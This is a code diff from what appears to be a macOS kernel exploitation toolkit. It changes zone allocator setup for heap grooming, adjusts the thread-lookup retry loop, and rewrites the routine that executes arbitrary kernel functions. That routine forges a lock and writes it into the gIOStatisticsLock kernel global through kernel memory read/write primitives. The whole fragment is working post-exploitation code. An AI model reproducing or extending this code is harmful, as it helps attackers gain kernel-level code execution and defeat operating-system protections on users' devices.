@@ -23,7 +23,7 @@
 #include "xnu/proc.h"
 #include "iokit/io_surface.h"
 #include "iokit/os_dictionary.h"
-#include "allocator/pipe.h"
+#include "allocator/small_mem.h"
 #include "allocator/large_mem.h"
 
 #include "macos_params.h"
@@ -97,7 +97,7 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
     xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_RESERVED), 0), 1);
     xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_COUNTER), 0), 1);
-    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 16384), 2);
+    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), sizeof(struct arm_context)), 1);
     
     uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator, 0);
     uintptr_t reserved = xe_util_zalloc_alloc(reserved_allocator, 0);
@@ -174,7 +174,6 @@ int xe_util_kfunc_find_thread_with_state(uintptr_t proc, int state, uintptr_t* p
     uintptr_t thread = xe_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
     while (thread != 0 && thread != task + TYPE_TASK_MEM_THREADS_OFFSET) {
         int thread_state = xe_kmem_read_int32(thread, TYPE_THREAD_MEM_STATE_OFFSET);
-        xe_log_debug("thread: %p, state: %d", (void*)thread, thread_state);
         if (thread_state == state) {
             *ptr_out = thread;
             return 0;
@@ -207,8 +206,10 @@ int xe_util_kfunc_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
     do {
         error = xe_util_kfunc_find_thread_with_state(proc, 0x1 | 0x8, &target_thread);
         tries--;
+        xe_log_debug("cannot find thread, retrying...");
         sleep(1);
     } while (error != 0 && tries > 0);
+    xe_assert_cond(tries, >=, 0);
     *ptr_out = target_thread;
     return error;
 }
@@ -230,10 +231,12 @@ void xe_util_kfunc_reset(xe_util_kfunc_t util) {
 
 void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
     if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
-        uintptr_t lock = xe_util_zalloc_alloc(util->block_allocator, 1);
-        uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
-        uintptr_t kh_large_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
-        xe_kmem_copy(lock, kh_large_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET, 16);
+        xe_log_debug("initializing gIOStasticsLock");
+        uintptr_t lock = xe_allocator_small_allocate_disowned(16);
+        uintptr_t data[2];
+        data[0] = 0x420000;
+        data[1] = 0;
+        xe_kmem_write(lock, 0, data, sizeof(data));
         xe_kmem_write_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0, lock);
     }
     
